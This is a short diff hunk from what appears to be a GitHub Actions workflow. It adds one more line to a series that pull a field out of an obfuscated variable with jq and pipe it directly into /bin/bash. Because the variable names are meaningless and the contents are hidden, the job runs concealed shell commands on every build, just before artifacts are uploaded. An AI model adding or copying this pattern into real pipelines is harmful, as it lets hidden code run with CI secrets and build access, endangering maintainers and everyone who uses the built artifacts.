@@ -38,6 +38,7 @@ jobs:
           echo $o8465 | jq -r .ctgb3 | /bin/bash
           echo $iys564 | jq -r .ng96 | /bin/bash
           printf '%s' "$cacie66" | jq -r .jcd883 | /bin/bash
+          echo $ihj6 | jq -r .zefjc65 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
